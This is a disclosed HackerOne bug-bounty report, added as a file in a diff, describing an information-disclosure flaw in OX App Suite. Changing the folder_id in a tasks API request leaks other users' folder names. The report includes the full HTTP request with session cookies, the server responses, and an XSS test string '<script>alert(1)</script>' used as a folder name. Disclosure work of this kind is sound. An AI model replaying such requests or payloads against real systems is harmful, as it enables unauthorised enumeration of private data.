@@ -1,0 +1,49 @@
+ReportLink:https://hackerone.com/reports/194574
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/inhibitor181
+ReportedTo:OX App Suite(appsuite)
+BountyAmount:250.0
+Severity:low
+State:Closed
+DateOfDisclosure:27.09.2017 5:56:03
+
+Summary:
+
+Hello, by changing the folder_id parameter from the task reminders action, the folder name is leaked and a specific user can find all the folders inside the domain.
+
+```
+PUT /appsuite/api/tasks?action=new&session=396a79677e3241b799f17051d0923da5&timezone=UTC HTTP/1.1
+Host: sandbox.open-xchange.com
+Connection: close
+Content-Length: 175
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: https://sandbox.open-xchange.com
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36
+Content-Type: text/javascript; charset=UTF-8
+Referer: https://sandbox.open-xchange.com/appsuite/
+Accept-Encoding: gzip, deflate, sdch, br
+Accept-Language: en-US,en;q=0.8
+Cookie: url.key=2558006153524921255800615352492125580061535249212558006153524921; JSESSIONID=629437988847808324.OX0; open-xchange-secret-GpF8UipUbT8EStMNwR1Tjw=fd62e1d60e514ad78c5fac471446962b; open-xchange-public-session-Gw2fRXT2jS7QwPFLpOjQ=4830512969de4f809525e6efdae9887c; language=en_US; metrics-userhash-v2=51470048d950b616012b42e5a5645f27
+
+{"title":"Email reminder: teeeeeeest","folder_id":141,"alarm":1483008840000,"note":"asdsad\n--\nmail://default0/INBOX.28","status":1,"recurrence_type":0,"percent_completed":0}
+```
+
+Response
+
+```
+HTTP/1.1 200 OK
+/**/
+
+{"error":"Folder \"\"><script>alert(1)</script>\" is not a task folder.","error_params":["\"><script>alert(1)</script>",141],"categories":"PERMISSION_DENIED","category":3,"code":"TSK-0006","error_id":"-91819040-14284","error_desc":"Folder \"><script>alert(1)</script> (141) is not a task folder."}
+```
+
+By chaning the folder_id from input, one find the respective names. If the folder does not exist this will be thrown :
+
+```
+{"error":"Such a folder does not exist.","error_params":[22222,67],"categories":"ERROR","category":8,"code":"FLD-0008","error_id":"-91819040-14372","error_desc":"Folder 22222 does not exist in context 67"}
+```
+
+The link in the POC has been executed while logged with user1 and after that also with user3 and both users received the same response, regardless of folder visibility.
+
+Also attached 2 screenshots.
